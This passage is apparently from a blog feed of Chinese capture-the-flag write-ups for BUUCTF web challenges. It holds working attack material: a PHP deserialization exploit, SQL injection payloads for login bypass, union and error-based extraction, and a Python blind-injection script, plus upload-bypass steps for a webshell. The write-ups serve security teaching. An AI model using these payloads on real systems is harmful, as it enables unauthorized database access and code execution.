class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化题目，可以看到想要执行命令必须满足MD5 、sha1值相等，但是既满足相等又要执行命令难以绕过。这里有个考察点就是：</p><blockquote><p>md5/sha1函数对一个类进行处理的时候会触发这个类的__toString魔术方法</p></blockquote><p>这里想到了利用原生类。利用Error 内置类，在进行处理的时候触发<code>__toString</code> ，先看一下类：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105322749.png" alt="image-20210421105322749"></p><p>可见会输出payload 错误文件路径 以及行号，所以我们要想得到输出相同就需要在同一行：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105525467.png" alt="image-20210421105525467"></p><p>可见这样就可以使的$a $b 相等，但是输出的报错信息相同。</p><p>接下来考虑怎么代码执行，首先我们需要控制整个代码块，利用<code>?&gt;&lt;?php</code> 形式，因为过滤了<code>&lt;?php</code> 采用短标签的形式<code>&lt;?=</code> ，其次过滤了小括号 因为控制了整个代码块，可以采取<code>include</code> flag文件的形式，过滤了”，无法利用 <code>include &quot;/flag&quot;</code> 利用取反绕过：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421111104661.png" alt="image-20210421111104661"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">输出报错信息：<span class="hljs-built_in">Error</span>: <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-meta">?&gt;</span><span class="hljs-comment">#先闭合</span><br>拼接：<span class="hljs-keyword">eval</span>(<span class="hljs-built_in">Error</span>: <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-meta">?&gt;</span>);<span class="hljs-comment">#成功控制代码块 包含文件</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">“?&gt;&lt;?<span class="hljs-operator">=</span>include~”.urldeocde(<span class="hljs-variable">%D0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%98</span>).<span class="hljs-string">&quot;?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>&#125;<br><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> SYCLOVER();<br><span class="hljs-variable">$v</span>-&gt;syc=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$v</span>-&gt;lover=<span class="hljs-variable">$b</span>;<br><span class="hljs-comment">#echo serialize($v);  </span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$v</span>));  <br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113013409.png" alt="image-20210421113013409"></p><h3 id="WEB-cross"><a href="#WEB-cross" class="headerlink" title="[WEB]cross"></a>[WEB]cross</h3><p>待解决</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BUUCTF-2020极客大挑战&quot;&gt;&lt;a href=&quot;#BUUCTF-2020极客大挑战&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF-2020极客大挑战&quot;&gt;&lt;/a&gt;BUUCTF-2020极客大挑战&lt;/h2&gt;&lt;h3 id=&quot;WEB-Welco</summary>
      
    
    
    
    <category term="Writeup" scheme="https://v1sun.github.io/categories/Writeup/"/>
    
    
    <category term="buuctf" scheme="https://v1sun.github.io/tags/buuctf/"/>
    
    <category term="Writeup" scheme="https://v1sun.github.io/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-2019极客大挑战</title>
    <link href="https://v1sun.github.io/2021/04/20/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>https://v1sun.github.io/2021/04/20/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
    <published>2021-04-20T03:30:00.000Z</published>
    <updated>2021-04-20T03:35:27.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF-2019极客大挑战"><a href="#BUUCTF-2019极客大挑战" class="headerlink" title="BUUCTF-2019极客大挑战"></a>BUUCTF-2019极客大挑战</h2><h3 id="WEB-EasySQL"><a href="#WEB-EasySQL" class="headerlink" title="[WEB]EasySQL"></a>[WEB]EasySQL</h3><p>万能密码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;+or+&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;+or+&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402220505761.png" alt="image-20210402220505761"></p><h3 id="WEB-LoveSQL"><a href="#WEB-LoveSQL" class="headerlink" title="[WEB]LoveSQL"></a>[WEB]LoveSQL</h3><p>万能密码可以登录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402171539900.png" alt="image-20210402171539900"></p><p>但是flag需要注入。</p><p>查列数：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-attr">username=</span>admin&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#&amp;password=123</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402171629989.png" alt="image-20210402171629989"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402171641365.png" alt="image-20210402171641365"></p><p>可见有三列，查看回显点：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span>&amp;password=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402172637842.png" alt="image-20210402172637842"></p><p>省略查库，查表：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span>&amp;password=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402172751176.png" alt="image-20210402172751176"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查列：<br><span class="hljs-attribute">username</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&quot;l0ve1ysq1&quot;</span>%23&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402173157960.png" alt="image-20210402173157960"></p><p>爆数据：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,password) from l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>%<span class="hljs-number">23</span>&amp;password=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402173404503.png" alt="image-20210402173404503"></p><p>查到flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;b<span class="hljs-number">895590</span>e-<span class="hljs-number">0</span>c<span class="hljs-number">68</span>-<span class="hljs-number">4</span>dfb-b<span class="hljs-number">555</span>-<span class="hljs-number">3</span>be<span class="hljs-number">711</span>d<span class="hljs-number">10</span>bd<span class="hljs-number">8</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="WEB-BabySQL"><a href="#WEB-BabySQL" class="headerlink" title="[WEB]BabySQL"></a>[WEB]BabySQL</h3><p>尝试万能密码错误</p><p>测试下过滤的函数：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402222313373.png" alt="image-20210402222313373"></p><p>但是发现双写可以绕过：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402223609035.png" alt="image-20210402223609035"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402223643259.png" alt="image-20210402223643259"></p><p>然后直接利用select查列：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?username=admin&amp;password=<span class="hljs-number">1</span>&#x27; ununionion selselectect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">%23 </span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402223727523.png" alt="image-20210402223727523"></p><p>三列，接下来查表、查列、爆数据：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402225524730.png" alt="image-20210402225524730"></p><p>可以看到 information_schema过滤了，经过反复测试fuzz，发现因为过滤了or 所以不能用from、information等。。双写绕过：</p><p>爆出所有数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion selselectect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata)--+</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402234905451.png" alt="image-20210402234905451"></p><p>猜测是ctf数据库，查表：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=admin&amp;password=1&#x27; ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&quot;ctf&quot;</span>--+<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402235100534.png" alt="image-20210402235100534"></p><p>查列：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=admin&amp;password=1&#x27; ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&quot;Flag&quot;</span> --+<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402235227136.png" alt="image-20210402235227136"></p><p>查询flag：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion selselectect 1,2,group_concat(flag) frfromom (ctf.Flag)--+</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402235501131.png" alt="image-20210402235501131"></p><p>以下是思路偏了。。。。不过复习了下无列名注入。。</p><p>尝试无列名注入，但是没有<code>sys.schema_auto_increment_columns</code>查不到表名，继续尝试绕过方法：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402231700799.png" alt="image-20210402231700799"></p><p>数据库名：<code>geek</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402231800292.png" alt="image-20210402231800292"></p><p>利用<code>mysql.innodb_table_stats</code>查询成功：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom mysql.innodb_table_stats)--+</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402232235915.png" alt="image-20210402232235915"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Flag</span>,b<span class="hljs-number">4</span>bsql,geekuser,gtid_slave_pos<br></code></pre></td></tr></table></figure><p>然后查列：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=admin&amp;password=1&#x27; ununionion selselectect 1,2,(selselectect * frfromom <span class="hljs-string">&quot;Flag&quot;</span>)--+<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402232618086.png" alt="image-20210402232618086"></p><p>又不可以了。开始无列名注入：</p><p>情景：已知表名，查不到列名，要查询键值。</p><p>构造pyaload：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">?username=admin&amp;password=1&#x27;</span> <span class="hljs-comment">ununionion</span> <span class="hljs-comment">selselectect</span> <span class="hljs-comment">1</span><span class="hljs-string">,</span><span class="hljs-comment">2</span><span class="hljs-string">,</span><span class="hljs-comment">(payload)</span>--<span class="hljs-literal">+</span><br><span class="hljs-comment">(selselectect</span> <span class="hljs-comment">group_concat(a)</span> <span class="hljs-comment">frfromom(selselectect</span> <span class="hljs-comment">1</span><span class="hljs-string">,</span><span class="hljs-comment">2</span><span class="hljs-string">,</span><span class="hljs-comment">3</span> <span class="hljs-comment">as</span> <span class="hljs-comment">a</span> <span class="hljs-comment">ununionion</span> <span class="hljs-comment">selselectect</span> <span class="hljs-comment">*</span> <span class="hljs-comment">frfromom</span> <span class="hljs-comment">Flag)a)</span><br></code></pre></td></tr></table></figure><h3 id="WEB-HardSQL"><a href="#WEB-HardSQL" class="headerlink" title="[WEB]HardSQL"></a>[WEB]HardSQL</h3><p>过滤了空格，and，substr等：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420104604.png" alt="image-20210420104604432"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420104625.png" alt="image-20210420104625820"></p><p>接下来报错注入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br> <br>url = <span class="hljs-string">&quot;http://81ecacad-3288-47d5-a92f-c94f4f8db30a.node3.buuoj.cn/check.php&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>data = <span class="hljs-string">&quot;?username=admin&amp;password=admin&#x27;&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">payload = &quot;or(updatexml(1,concat(0x7e,(select(database()))),1))%23&quot;</span><br><span class="hljs-string">payload = &quot;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;)))),1))%23&quot;</span><br><span class="hljs-string">payload = &quot;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;)))),1))%23&quot;</span><br><span class="hljs-string">payload = &quot;or(updatexml(1,concat(0x7e,(select(password)from(geek.H4rDsq1))),1))%23&quot;</span><br><span class="hljs-string">payload = &quot;or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))),1))%23&quot;</span><br><span class="hljs-string">payload = &quot;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))),1))%23&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>res = requests.get(url+data+payload)<br><span class="hljs-built_in">print</span> (res.text)<br></code></pre></td></tr></table></figure><h3 id="WEB-FinalSQL"><a href="#WEB-FinalSQL" class="headerlink" title="[WEB]FinalSQL"></a>[WEB]FinalSQL</h3><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420095002.png" alt="image-20210420095002425"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420095048.png" alt="image-20210420095048727"></p><p>接下来盲注即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br> <br>url = <span class="hljs-string">&quot;http://6c3c2750-e1ad-449e-b84e-929cda2535ee.node3.buuoj.cn/search.php&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">i,j</span>):</span><br>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                  #数据库名字geek        </span><br>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br>    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span>%(i,j)                                                        <span class="hljs-comment">#数据mygod cl4y_is_really_amazing</span><br>    data = &#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>    r = requests.get(url,params=data)<br>    <span class="hljs-comment"># print (r.url)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        res = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> res<br> <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>) :<br>        <span class="hljs-built_in">print</span>(i,<span class="hljs-string">&#x27;:&#x27;</span>)<br>        low = <span class="hljs-number">31</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt;= high :<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            res = payload(i,mid)<br>            <span class="hljs-keyword">if</span> res :<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span> :<br>                high = mid - <span class="hljs-number">1</span><br>        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># print (f)</span><br>        flag += <span class="hljs-built_in">chr</span>(f)<br>        <span class="hljs-built_in">print</span>(flag)<br> <br>exp()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag=&#x27;</span>,flag)<br></code></pre></td></tr></table></figure><h3 id="WEB-Upload"><a href="#WEB-Upload" class="headerlink" title="[WEB]Upload"></a>[WEB]Upload</h3><p>打开题目发现是文件上传jpg后缀的php文件发现验证不是图片，抓包修改文件头为图片：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402215418750.png" alt="image-20210402215418750"></p><p>发现后缀不可以，burp fuzz下文件名：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402215501335.png" alt="image-20210402215501335"></p><p>发现phtml后缀可以成功上传。</p><p>访问/upload/1.phtml：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210402215539868.png" alt="image-20210402215539868"></p><p>然后连接菜刀找flag。</p><h3 id="WEB-BuyFlag"><a href="#WEB-BuyFlag" class="headerlink" title="[WEB]BuyFlag"></a>[WEB]BuyFlag</h3><p>修改cookie：user=1 ，绕过is_numberic() ，数组绕过数字长度</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420093936.png" alt="image-20210420093936893"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420093918.png" alt="image-20210420093918626"></p><h3 id="WEB-RCE-ME"><a href="#WEB-RCE-ME" class="headerlink" title="[WEB]RCE ME"></a>[WEB]RCE ME</h3><p>直接构造取反shell：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420112857.png" alt="image-20210420112857333"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420112909.png" alt="image-20210420112908900"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BUUCTF-2019极客大挑战&quot;&gt;&lt;a href=&quot;#BUUCTF-2019极客大挑战&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF-2019极客大挑战&quot;&gt;&lt;/a&gt;BUUCTF-2019极客大挑战&lt;/h2&gt;&lt;h3 id=&quot;WEB-EasyS</summary>
      
    
    
    
    <category term="Writeup" scheme="https://v1sun.github.io/categories/Writeup/"/>
    
    
    <category term="buuctf" scheme="https://v1sun.github.io/tags/buuctf/"/>
    
    <category term="Writeup" scheme="https://v1sun.github.io/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-GYCTF2020</title>
    <link href="https://v1sun.github.io/2021/04/19/BUUCTF-GYCTF2020/"/>
    <id>https://v1sun.github.io/2021/04/19/BUUCTF-GYCTF2020/</id>
    <published>2021-04-19T13:10:00.000Z</published>
    <updated>2021-04-20T03:32:01.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF-GYCTF2020"><a href="#BUUCTF-GYCTF2020" class="headerlink" title="BUUCTF-GYCTF2020"></a>BUUCTF-GYCTF2020</h2><h3 id="WEB-Node-Game"><a href="#WEB-Node-Game" class="headerlink" title="[WEB]Node Game"></a>[WEB]Node Game</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>可以查看源码，代码审计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 